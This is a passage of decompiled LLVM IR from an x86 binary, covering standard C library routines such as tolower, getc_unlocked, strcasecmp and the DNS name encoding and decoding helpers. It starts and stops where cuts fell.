  %v1_8057b75 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8057b75, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8057b75, -4095
  br i1 %tmp18, label %dec_label_pc_8057b8f, label %dec_label_pc_8057b81

dec_label_pc_8057b81:                             ; preds = %entry
  %v2_8057b62 = ashr i32 %arg3, 31
  %v1_8057b81 = call i32 @__errno_location(i32 %v2_8057b62)
  %v0_8057b86 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057b86 = sub i32 0, %v0_8057b86
  %v2_8057b88 = inttoptr i32 %v1_8057b81 to i32*
  store i32 %v1_8057b86, i32* %v2_8057b88, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8057ba3.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8057b93

dec_label_pc_8057b8f:                             ; preds = %entry
  %v1_8057b8f = icmp eq i32 %v1_8057b75, 0
  br i1 %v1_8057b8f, label %dec_label_pc_8057b98, label %dec_label_pc_8057b93

dec_label_pc_8057b93:                             ; preds = %dec_label_pc_8057b8f, %dec_label_pc_8057b81
  %v2_8057ba3.pre = phi i32 [ %v0_8057b4a, %dec_label_pc_8057b8f ], [ %v2_8057ba3.pre.pre, %dec_label_pc_8057b81 ]
  %v0_8057b93 = phi i32 [ %v1_8057b75, %dec_label_pc_8057b8f ], [ -1, %dec_label_pc_8057b81 ]
  %v1_8057b95 = ashr i32 %v0_8057b93, 31
  br label %dec_label_pc_8057ba0

dec_label_pc_8057b98:                             ; preds = %dec_label_pc_8057b8f
  %v3_8057b98 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8057ba0

dec_label_pc_8057ba0:                             ; preds = %dec_label_pc_8057b93, %dec_label_pc_8057b98
  %v2_8057ba3 = phi i32 [ %v2_8057ba3.pre, %dec_label_pc_8057b93 ], [ %v0_8057b4a, %dec_label_pc_8057b98 ]
  %v0_8057ba6 = phi i32 [ %v0_8057b93, %dec_label_pc_8057b93 ], [ %v3_8057b98, %dec_label_pc_8057b98 ]
  %storemerge = phi i32 [ %v1_8057b95, %dec_label_pc_8057b93 ], [ %tmp, %dec_label_pc_8057b98 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_8057ba3, i32* @ebx, align 4
  ret i32 %v0_8057ba6

; uselistorder directives
  uselistorder i32 %v1_8057b75, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8057b4a, { 1, 0, 2 }
  uselistorder i32 31, { 31, 32, 16, 33, 34, 35, 36, 37, 38, 12, 2, 3, 0, 1, 11, 22, 17, 18, 19, 6, 7, 4, 5, 13, 8, 9, 39, 40, 20, 14, 15, 21, 23, 24, 25, 10, 26, 27, 28, 29, 30 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057ba0, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8057bac = add i32 %arg1, 128
  %v6_8057bb7 = icmp ugt i32 %v1_8057bac, 383
  br i1 %v6_8057bb7, label %dec_label_pc_8057bc2, label %dec_label_pc_8057bb9

dec_label_pc_8057bb9:                             ; preds = %entry
  %v0_8057bb9 = load i32, i32* bitcast (i32** @global_var_805d440.503 to i32*), align 64
  %v2_8057bbe = mul i32 %arg1, 2
  %v3_8057bbe = add i32 %v0_8057bb9, %v2_8057bbe
  %v4_8057bbe = inttoptr i32 %v3_8057bbe to i16*
  %v5_8057bbe = load i16, i16* %v4_8057bbe, align 2
  %v6_8057bbe = sext i16 %v5_8057bbe to i32
  store i32 %v6_8057bbe, i32* @edx, align 4
  br label %dec_label_pc_8057bc2

dec_label_pc_8057bc2:                             ; preds = %entry, %dec_label_pc_8057bb9
  %v0_8057bc2 = phi i32 [ %arg1, %entry ], [ %v6_8057bbe, %dec_label_pc_8057bb9 ]
  ret i32 %v0_8057bc2

; uselistorder directives
  uselistorder label %dec_label_pc_8057bc2, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_5()
  %stack_var_-5 = alloca i8, align 1
  %v0_8057bc8 = load i32, i32* @ebx, align 4
  %v4_8057bcc = ptrtoint i16* %tmp to i32
  store i32 %v4_8057bcc, i32* @ebx, align 4
  %v1_8057bd0 = add i32 %v4_8057bcc, 16
  %v2_8057bd0 = inttoptr i32 %v1_8057bd0 to i32*
  %v3_8057bd0 = load i32, i32* %v2_8057bd0, align 4
  %v2_8057bd3 = add i32 %v4_8057bcc, 24
  %v3_8057bd3 = inttoptr i32 %v2_8057bd3 to i32*
  %v4_8057bd3 = load i32, i32* %v3_8057bd3, align 4
  %v10_8057bd3 = icmp ult i32 %v3_8057bd0, %v4_8057bd3
  br i1 %v10_8057bd3, label %dec_label_pc_8057c75, label %dec_label_pc_8057bdc

dec_label_pc_8057bdc:                             ; preds = %entry
  %v2_8057bdc = load i16, i16* %tmp, align 2
  %v3_8057bdc = zext i16 %v2_8057bdc to i32
  %v1_8057bdf = and i32 %v3_8057bdc, 131
  %v6_8057be9 = icmp ugt i32 %v1_8057bdf, 128
  br i1 %v6_8057be9, label %dec_label_pc_8057c03, label %dec_label_pc_8057beb

dec_label_pc_8057beb:                             ; preds = %dec_label_pc_8057bdc
  %v0_8057beb = load i32, i32* @edx, align 4
  %v6_8057bf3 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8057beb, i32 %v0_8057beb)
  %v1_8057bfb = icmp eq i32 %v6_8057bf3, 0
  %v1_8057bfd = icmp eq i1 %v1_8057bfb, false
  br i1 %v1_8057bfd, label %dec_label_pc_8057c9a, label %dec_label_pc_8057beb.dec_label_pc_8057c03_crit_edge

dec_label_pc_8057beb.dec_label_pc_8057c03_crit_edge: ; preds = %dec_label_pc_8057beb
  %v0_8057c03.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057c03

dec_label_pc_8057c03:                             ; preds = %dec_label_pc_8057beb.dec_label_pc_8057c03_crit_edge, %dec_label_pc_8057bdc
  %v2_8057c37 = phi i32 [ %v0_8057c03.pre, %dec_label_pc_8057beb.dec_label_pc_8057c03_crit_edge ], [ %v4_8057bcc, %dec_label_pc_8057bdc ]
  %v1_8057c03 = inttoptr i32 %v2_8057c37 to i32*
  %v2_8057c03 = load i32, i32* %v1_8057c03, align 4
  store i32 %v2_8057c03, i32* @ecx, align 4
  %v1_8057c05 = urem i32 %v2_8057c03, 65536
  store i32 %v1_8057c05, i32* %edx.global-to-local, align 4
  %v2_8057c08 = and i32 %v2_8057c03, 2
  %v3_8057c08 = icmp eq i32 %v2_8057c08, 0
  br i1 %v3_8057c08, label %dec_label_pc_8057c26, label %dec_label_pc_8057c0d

dec_label_pc_8057c0d:                             ; preds = %dec_label_pc_8057c03
  %v1_8057c0d = urem i32 %v2_8057c03, 2
  store i32 %v1_8057c0d, i32* %edx.global-to-local, align 4
  %v1_8057c10 = add i32 %v2_8057c03, 65535
  %v1_8057c13 = trunc i32 %v1_8057c10 to i16
  %v3_8057c13 = inttoptr i32 %v2_8057c37 to i16*
  store i16 %v1_8057c13, i16* %v3_8057c13, align 2
  %v0_8057c16 = load i32, i32* @ebx, align 4
  %v1_8057c16 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057c16 = mul i32 %v1_8057c16, 4
  %v3_8057c16 = add i32 %v0_8057c16, 36
  %v4_8057c16 = add i32 %v3_8057c16, %v2_8057c16
  %v5_8057c16 = inttoptr i32 %v4_8057c16 to i8*
  %v6_8057c16 = load i8, i8* %v5_8057c16, align 1
  %v7_8057c16 = zext i8 %v6_8057c16 to i32
  %v9_8057c16 = and i32 %v1_8057c16, -256
  %v10_8057c16 = or i32 %v7_8057c16, %v9_8057c16
  store i32 %v10_8057c16, i32* %edx.global-to-local, align 4
  %v1_8057c1a = add i32 %v0_8057c16, 40
  %v2_8057c1a = inttoptr i32 %v1_8057c1a to i32*
  store i32 0, i32* %v2_8057c1a, align 4
  %v0_8057c21 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057c21 = urem i32 %v0_8057c21, 256
  store i32 %v1_8057c21, i32* @edx, align 4
  br label %dec_label_pc_8057c9d

dec_label_pc_8057c26:                             ; preds = %dec_label_pc_8057c03
  %v1_8057c26 = add i32 %v2_8057c37, 16
  %v2_8057c26 = inttoptr i32 %v1_8057c26 to i32*
  %v3_8057c26 = load i32, i32* %v2_8057c26, align 4
  store i32 %v3_8057c26, i32* @eax, align 4
  %v1_8057c29 = add i32 %v2_8057c37, 20
  %v2_8057c29 = inttoptr i32 %v1_8057c29 to i32*
  %v3_8057c29 = load i32, i32* %v2_8057c29, align 4
  %v15_8057c29 = icmp eq i32 %v3_8057c29, %v3_8057c26
  %v1_8057c2c = icmp eq i1 %v15_8057c29, false
  br i1 %v1_8057c2c, label %dec_label_pc_8057c75, label %dec_label_pc_8057c2e

dec_label_pc_8057c2e:                             ; preds = %dec_label_pc_8057c26
  %v1_8057c2e = add i32 %v2_8057c37, 4
  %v2_8057c2e = inttoptr i32 %v1_8057c2e to i32*
  %v3_8057c2e = load i32, i32* %v2_8057c2e, align 4
  %v13_8057c2e = icmp eq i32 %v3_8057c2e, -2
  %v1_8057c32 = icmp eq i1 %v13_8057c2e, false
  br i1 %v1_8057c32, label %dec_label_pc_8057c3c, label %dec_label_pc_8057c34

dec_label_pc_8057c34:                             ; preds = %dec_label_pc_8057c2e
  %v1_8057c34 = or i32 %v2_8057c03, 4
  store i32 %v1_8057c34, i32* @ecx, align 4
  %v1_8057c37 = trunc i32 %v1_8057c34 to i16
  %v3_8057c37 = inttoptr i32 %v2_8057c37 to i16*
  store i16 %v1_8057c37, i16* %v3_8057c37, align 2
  br label %dec_label_pc_8057c9a

dec_label_pc_8057c3c:                             ; preds = %dec_label_pc_8057c2e
  %v1_8057c3c = udiv i32 %v2_8057c03, 256
  %v2_8057c3c = trunc i32 %v1_8057c3c to i8
  %v3_8057c3c = urem i8 %v2_8057c3c, 4
  %v4_8057c3c = icmp eq i8 %v3_8057c3c, 0
  %v8_8057c3c = zext i8 %v3_8057c3c to i32
  %v10_8057c3c = mul nuw nsw i32 %v8_8057c3c, 256
  %v11_8057c3c = urem i32 %v2_8057c03, 256
  %v12_8057c3c = or i32 %v10_8057c3c, %v11_8057c3c
  store i32 %v12_8057c3c, i32* %edx.global-to-local, align 4
  br i1 %v4_8057c3c, label %dec_label_pc_8057c51, label %dec_label_pc_8057c41

dec_label_pc_8057c41:                             ; preds = %dec_label_pc_8057c3c
  %v3_8057c49 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805d208.489 to i16*))
  %v0_8057c51.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057c51

dec_label_pc_8057c51:                             ; preds = %dec_label_pc_8057c3c, %dec_label_pc_8057c41
  %v0_8057c86 = phi i32 [ %v2_8057c37, %dec_label_pc_8057c3c ], [ %v0_8057c51.pre, %dec_label_pc_8057c41 ]
  %v1_8057c51 = add i32 %v0_8057c86, 8
  %v2_8057c51 = inttoptr i32 %v1_8057c51 to i32*
  %v3_8057c51 = load i32, i32* %v2_8057c51, align 4
  %v1_8057c54 = add i32 %v0_8057c86, 12
  %v2_8057c54 = inttoptr i32 %v1_8057c54 to i32*
  %v3_8057c54 = load i32, i32* %v2_8057c54, align 4
  %v15_8057c54 = icmp eq i32 %v3_8057c54, %v3_8057c51
  br i1 %v15_8057c54, label %dec_label_pc_8057c7e, label %dec_label_pc_8057c59

dec_label_pc_8057c59:                             ; preds = %dec_label_pc_8057c51
  %v2_8057c5c = add i32 %v0_8057c86, 24
  %v3_8057c5c = inttoptr i32 %v2_8057c5c to i32*
  store i32 %v3_8057c51, i32* %v3_8057c5c, align 4
  %v0_8057c5f = load i32, i32* @ebx, align 4
  %v2_8057c60 = call i32 @__stdio_rfill(i32 %v0_8057c5f)
  %v1_8057c68 = icmp eq i32 %v2_8057c60, 0
  br i1 %v1_8057c68, label %dec_label_pc_8057c9a, label %dec_label_pc_8057c6c

dec_label_pc_8057c6c:                             ; preds = %dec_label_pc_8057c59
  %v0_8057c6c = load i32, i32* @ebx, align 4
  %v1_8057c6c = add i32 %v0_8057c6c, 20
  %v2_8057c6c = inttoptr i32 %v1_8057c6c to i32*
  %v3_8057c6c = load i32, i32* %v2_8057c6c, align 4
  %v2_8057c6f = add i32 %v0_8057c6c, 24
  %v3_8057c6f = inttoptr i32 %v2_8057c6f to i32*
  store i32 %v3_8057c6c, i32* %v3_8057c6f, align 4
  %v0_8057c72 = load i32, i32* @ebx, align 4
  %v1_8057c72 = add i32 %v0_8057c72, 16
  %v2_8057c72 = inttoptr i32 %v1_8057c72 to i32*
  %v3_8057c72 = load i32, i32* %v2_8057c72, align 4
  br label %dec_label_pc_8057c75

dec_label_pc_8057c75:                             ; preds = %dec_label_pc_8057c26, %entry, %dec_label_pc_8057c6c
  %v1_8057c79 = phi i32 [ %v2_8057c37, %dec_label_pc_8057c26 ], [ %v4_8057bcc, %entry ], [ %v0_8057c72, %dec_label_pc_8057c6c ]
  %v0_8057c75 = phi i32 [ %v3_8057c26, %dec_label_pc_8057c26 ], [ %v3_8057bd0, %entry ], [ %v3_8057c72, %dec_label_pc_8057c6c ]
  %v1_8057c75 = inttoptr i32 %v0_8057c75 to i8*
  %v2_8057c75 = load i8, i8* %v1_8057c75, align 1
  %v3_8057c75 = zext i8 %v2_8057c75 to i32
  store i32 %v3_8057c75, i32* @edx, align 4
  %v1_8057c78 = add i32 %v0_8057c75, 1
  %v2_8057c79 = add i32 %v1_8057c79, 16
  %v3_8057c79 = inttoptr i32 %v2_8057c79 to i32*
  store i32 %v1_8057c78, i32* %v3_8057c79, align 4
  %v0_8057c9d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8057c9d

dec_label_pc_8057c7e:                             ; preds = %dec_label_pc_8057c51
  %v2_8057c81 = ptrtoint i8* %stack_var_-5 to i32
  %v5_8057c86 = inttoptr i32 %v0_8057c86 to i16*
  %v5_8057c87 = call i32 @__stdio_READ(i16* %v5_8057c86, i32 %v2_8057c81, i32 1)
  %v1_8057c8f = icmp eq i32 %v5_8057c87, 0
  br i1 %v1_8057c8f, label %dec_label_pc_8057c9a, label %dec_label_pc_8057c93

dec_label_pc_8057c93:                             ; preds = %dec_label_pc_8057c7e
  %v3_8057c93 = load i8, i8* %stack_var_-5, align 1
  %v4_8057c93 = sext i8 %v3_8057c93 to i32
  store i32 %v4_8057c93, i32* @edx, align 4
  br label %dec_label_pc_8057c9d

dec_label_pc_8057c9a:                             ; preds = %dec_label_pc_8057c7e, %dec_label_pc_8057c59, %dec_label_pc_8057beb, %dec_label_pc_8057c34
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8057c9d

dec_label_pc_8057c9d:                             ; preds = %dec_label_pc_8057c93, %dec_label_pc_8057c75, %dec_label_pc_8057c0d, %dec_label_pc_8057c9a
  %v0_8057c9d = phi i32 [ %v4_8057c93, %dec_label_pc_8057c93 ], [ %v0_8057c9d.pre, %dec_label_pc_8057c75 ], [ %v1_8057c21, %dec_label_pc_8057c0d ], [ -1, %dec_label_pc_8057c9a ]
  store i32 %v0_8057bc8, i32* @ebx, align 4
  ret i32 %v0_8057c9d

; uselistorder directives
  uselistorder i32 %v0_8057c75, { 1, 0 }
  uselistorder i32 %v3_8057c51, { 1, 0 }
  uselistorder i32 %v0_8057c86, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8057c3c, { 1, 0 }
  uselistorder i32 %v3_8057c26, { 1, 0, 2 }
  uselistorder i32 %v1_8057c21, { 1, 0 }
  uselistorder i32 %v2_8057c03, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8057c37, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32* @global_var_805d240.482, { 1, 2, 0 }
  uselistorder i32 -2, { 0, 2, 7, 15, 16, 1, 14, 18, 19, 3, 5, 4, 20, 8, 9, 10, 17, 11, 12, 6, 13 }
  uselistorder i32 40, { 4, 5, 6, 7, 8, 9, 10, 1, 2, 11, 12, 13, 14, 3, 0 }
  uselistorder i32 -256, { 94, 1, 95, 0, 96, 23, 24, 97, 98, 3, 65, 64, 2, 99, 100, 101, 102, 6, 103, 4, 104, 5, 105, 131, 8, 67, 66, 7, 106, 107, 108, 109, 110, 111, 112, 113, 140, 114, 39, 40, 41, 86, 141, 133, 134, 142, 89, 88, 9, 128, 129, 115, 116, 117, 118, 119, 10, 120, 121, 11, 122, 123, 124, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 17, 63, 18, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 20, 21, 22, 87, 19, 90, 91, 92, 93, 126, 125, 127, 130, 12, 132, 139, 136, 14, 137, 15, 138, 13, 135, 16 }
  uselistorder i32 36, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 3, 4, 18, 6, 19, 20, 21, 22, 5, 0, 1 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 128, { 7, 15, 18, 14, 16, 2, 3, 8, 9, 17, 4, 10, 11, 19, 0, 20, 21, 5, 1, 12, 22, 13, 6 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder i32 24, { 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 6, 12, 21, 13, 31, 32, 33, 34, 35, 36, 37, 38, 3, 14, 15, 16, 17, 18, 19, 4, 5, 7, 8, 9, 10, 2, 11, 20, 1 }
  uselistorder label %dec_label_pc_8057c9d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057c9a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8057c75, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057c51, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8057ca6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057ca6, i32* @ecx, align 4
  %v0_8057cb0 = load i32, i32* bitcast (i32** @global_var_805d440.503 to i32*), align 64
  br label %dec_label_pc_8057cb6

dec_label_pc_8057cb6:                             ; preds = %dec_label_pc_8057cd3, %entry
  %v0_8057cd96 = phi i32 [ %v0_8057cd97, %dec_label_pc_8057cd3 ], [ 0, %entry ]
  %v0_8057cd3 = phi i32 [ %v1_8057cd3, %dec_label_pc_8057cd3 ], [ %arg2, %entry ]
  %v0_8057cd4 = phi i32 [ %v1_8057cd4, %dec_label_pc_8057cd3 ], [ %v4_8057ca6, %entry ]
  %v12_8057cb6 = icmp eq i32 %v0_8057cd4, %v0_8057cd3
  %.pre = inttoptr i32 %v0_8057cd4 to i8*
  br i1 %v12_8057cb6, label %dec_label_pc_8057cce, label %dec_label_pc_8057cba

dec_label_pc_8057cba:                             ; preds = %dec_label_pc_8057cb6
  %v2_8057cba = load i8, i8* %.pre, align 1
  %v3_8057cba = zext i8 %v2_8057cba to i32
  %v2_8057cbd = mul nuw nsw i32 %v3_8057cba, 2
  %v3_8057cbd = add i32 %v2_8057cbd, %v0_8057cb0
  %v4_8057cbd = inttoptr i32 %v3_8057cbd to i16*
  %v5_8057cbd = load i16, i16* %v4_8057cbd, align 2
  %v6_8057cbd = sext i16 %v5_8057cbd to i32
  %v1_8057cc1 = inttoptr i32 %v0_8057cd3 to i8*
  %v2_8057cc1 = load i8, i8* %v1_8057cc1, align 1
  %v3_8057cc1 = zext i8 %v2_8057cc1 to i32
  %v2_8057cc4 = mul nuw nsw i32 %v3_8057cc1, 2
  %v3_8057cc4 = add i32 %v2_8057cc4, %v0_8057cb0
  %v4_8057cc4 = inttoptr i32 %v3_8057cc4 to i16*
  %v5_8057cc4 = load i16, i16* %v4_8057cc4, align 2
  %v6_8057cc4 = sext i16 %v5_8057cc4 to i32
  %v2_8057cc8 = sub nsw i32 %v6_8057cbd, %v6_8057cc4
  %v12_8057cc8 = icmp eq i32 %v2_8057cc8, 0
  store i32 %v2_8057cc8, i32* @edx, align 4
  %v1_8057ccc = icmp eq i1 %v12_8057cc8, false
  br i1 %v1_8057ccc, label %dec_label_pc_8057cd7, label %dec_label_pc_8057cce

dec_label_pc_8057cce:                             ; preds = %dec_label_pc_8057cb6, %dec_label_pc_8057cba
  %v0_8057cd97 = phi i32 [ %v2_8057cc8, %dec_label_pc_8057cba ], [ %v0_8057cd96, %dec_label_pc_8057cb6 ]
  %v2_8057cce = load i8, i8* %.pre, align 1
  %v3_8057cce = icmp eq i8 %v2_8057cce, 0
  br i1 %v3_8057cce, label %dec_label_pc_8057cd7, label %dec_label_pc_8057cd3

dec_label_pc_8057cd3:                             ; preds = %dec_label_pc_8057cce
  %v1_8057cd3 = add i32 %v0_8057cd3, 1
  %v1_8057cd4 = add i32 %v0_8057cd4, 1
  store i32 %v1_8057cd4, i32* @ecx, align 4
  br label %dec_label_pc_8057cb6

dec_label_pc_8057cd7:                             ; preds = %dec_label_pc_8057cce, %dec_label_pc_8057cba
  %v0_8057cd9 = phi i32 [ %v0_8057cd97, %dec_label_pc_8057cce ], [ %v2_8057cc8, %dec_label_pc_8057cba ]
  ret i32 %v0_8057cd9

; uselistorder directives
  uselistorder i32 %v1_8057cd4, { 1, 0 }
  uselistorder i32 %v0_8057cd97, { 1, 0 }
  uselistorder i32 %v2_8057cc8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057cd4, { 2, 1, 0 }
  uselistorder i32 %v0_8057cd3, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057cce, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8057cdd = load i32, i32* @edi, align 4
  %v0_8057cde = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8057ce5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057ce5, i32* @edi, align 4
  %v1_8057d445 = icmp eq i8* %arg1, null
  br i1 %v1_8057d445, label %dec_label_pc_8057d4d, label %dec_label_pc_8057d48.lr.ph

dec_label_pc_8057d48.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057d48

dec_label_pc_8057ceb:                             ; preds = %dec_label_pc_8057d48
  %v5_8057cf0 = call i32 @__GI_strchr(i8* %v1_8057d48, i32 46)
  %v1_8057cfa = icmp eq i32 %v5_8057cf0, 0
  br i1 %v1_8057cfa, label %dec_label_pc_8057d04, label %dec_label_pc_8057cfe

dec_label_pc_8057cfe:                             ; preds = %dec_label_pc_8057ceb
  %v1_8057d00 = load i32, i32* @edi, align 4
  %v2_8057d00 = sub i32 %v5_8057cf0, %v1_8057d00
  br label %dec_label_pc_8057d12

dec_label_pc_8057d04:                             ; preds = %dec_label_pc_8057ceb
  %v0_8057d07 = load i32, i32* @edi, align 4
  %v5_8057d07 = inttoptr i32 %v0_8057d07 to i8*
  %v3_8057d08 = call i32 @strlen(i8* %v5_8057d07)
  br label %dec_label_pc_8057d12

dec_label_pc_8057d12:                             ; preds = %dec_label_pc_8057cfe, %dec_label_pc_8057d04
  %v0_8057d25 = phi i32 [ %v2_8057d00, %dec_label_pc_8057cfe ], [ %v3_8057d08, %dec_label_pc_8057d04 ]
  store i32 %v0_8057d25, i32* @esi, align 4
  %v1_8057d12 = icmp eq i32 %v0_8057d25, 0
  %v3_8057d12 = trunc i32 %v0_8057d25 to i8
  br i1 %v1_8057d12, label %dec_label_pc_8057d61, label %dec_label_pc_8057d16

dec_label_pc_8057d16:                             ; preds = %dec_label_pc_8057d12
  %v1_8057d1a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057d1a = sub i32 %arg3, %v1_8057d1a
  %v1_8057d1c = add i32 %v2_8057d1a, -1
  %v7_8057d1d = icmp ult i32 %v0_8057d25, %v1_8057d1c
  %v1_8057d1f = icmp eq i1 %v7_8057d1d, false
  br i1 %v1_8057d1f, label %dec_label_pc_8057d61, label %dec_label_pc_8057d21

dec_label_pc_8057d21:                             ; preds = %dec_label_pc_8057d16
  store i32 %arg2, i32* @edx, align 4
  %v4_8057d27 = add i32 %v1_8057d1a, %arg2
  %v5_8057d27 = inttoptr i32 %v4_8057d27 to i8*
  store i8 %v3_8057d12, i8* %v5_8057d27, align 1
  %v0_8057d2a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057d2a = add i32 %v0_8057d2a, 1
  %v0_8057d2c = load i32, i32* @edx, align 4
  %v2_8057d2e = add i32 %v1_8057d2a, %v0_8057d2c
  %v0_8057d30 = load i32, i32* @esi, align 4
  %v0_8057d31 = load i32, i32* @edi, align 4
  %v2_8057d33 = add i32 %v0_8057d30, %v1_8057d2a
  store i32 %v2_8057d33, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_8057d2e to i16*
  %v7_8057d35 = call i32 @memcpy(i16* %tmp30, i32 %v0_8057d31, i32 %v0_8057d30)
  %v1_8057d41 = add i32 %v5_8057cf0, 1
  br i1 %v1_8057cfa, label %dec_label_pc_8057d4d, label %dec_label_pc_8057d44

dec_label_pc_8057d44:                             ; preds = %dec_label_pc_8057d21
  store i32 %v1_8057d41, i32* @edi, align 4
  %v1_8057d44 = icmp eq i32 %v1_8057d41, 0
  br i1 %v1_8057d44, label %dec_label_pc_8057d4d, label %dec_label_pc_8057d48

dec_label_pc_8057d48:                             ; preds = %dec_label_pc_8057d48.lr.ph, %dec_label_pc_8057d44
  %v0_8057cef = phi i32 [ %v4_8057ce5, %dec_label_pc_8057d48.lr.ph ], [ %v1_8057d41, %dec_label_pc_8057d44 ]
  %v1_8057d48 = inttoptr i32 %v0_8057cef to i8*
  %v2_8057d48 = load i8, i8* %v1_8057d48, align 1
  %v3_8057d48 = icmp eq i8 %v2_8057d48, 0
  %v1_8057d4b = icmp eq i1 %v3_8057d48, false
  br i1 %v1_8057d4b, label %dec_label_pc_8057ceb, label %dec_label_pc_8057d4d

dec_label_pc_8057d4d:                             ; preds = %dec_label_pc_8057d44, %dec_label_pc_8057d48, %dec_label_pc_8057d21, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_8057d61, label %dec_label_pc_8057d54

dec_label_pc_8057d54:                             ; preds = %dec_label_pc_8057d4d
  %v1_8057d58 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057d58 = add i32 %v1_8057d58, %arg2
  %v3_8057d58 = inttoptr i32 %v2_8057d58 to i8*
  store i8 0, i8* %v3_8057d58, align 1
  %v0_8057d5c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057d5c = add i32 %v0_8057d5c, 1
  br label %dec_label_pc_8057d64

dec_label_pc_8057d61:                             ; preds = %dec_label_pc_8057d16, %dec_label_pc_8057d12, %dec_label_pc_8057d4d
  br label %dec_label_pc_8057d64

dec_label_pc_8057d64:                             ; preds = %dec_label_pc_8057d54, %dec_label_pc_8057d61
  %storemerge3 = phi i32 [ %v1_8057d5c, %dec_label_pc_8057d54 ], [ -1, %dec_label_pc_8057d61 ]
  store i32 %v0_8057cde, i32* @esi, align 4
  store i32 %v0_8057cdd, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_8057d48, { 1, 0 }
  uselistorder i32 %v1_8057d41, { 0, 2, 1 }
  uselistorder i32 %v0_8057d30, { 1, 0 }
  uselistorder i1 %v1_8057cfa, { 1, 0 }
  uselistorder i32 %v5_8057cf0, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 7, 6, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 5, 6, 7, 14, 15 }
  uselistorder i32 46, { 2, 5, 0, 6, 1, 3, 4 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_8057d64, { 1, 0 }
  uselistorder label %dec_label_pc_8057d61, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057d4d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057d48, { 1, 0 }
  uselistorder label %dec_label_pc_8057d12, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8057d6e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8057d77 = icmp eq i32 %arg1, 0
  br i1 %v4_8057d77, label %dec_label_pc_8057e38, label %dec_label_pc_8057d82

dec_label_pc_8057d82:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8057e202740 = add i32 %arg2, %arg1
  %v3_8057e202841 = inttoptr i32 %v2_8057e202740 to i8*
  %v4_8057e202942 = load i8, i8* %v3_8057e202841, align 1
  %v1_8057e243144 = icmp eq i8 %v4_8057e202942, 0
  %v1_8057e263245 = icmp eq i1 %v1_8057e243144, false
  br i1 %v1_8057e263245, label %dec_label_pc_8057d90.lr.ph, label %dec_label_pc_8057e2c

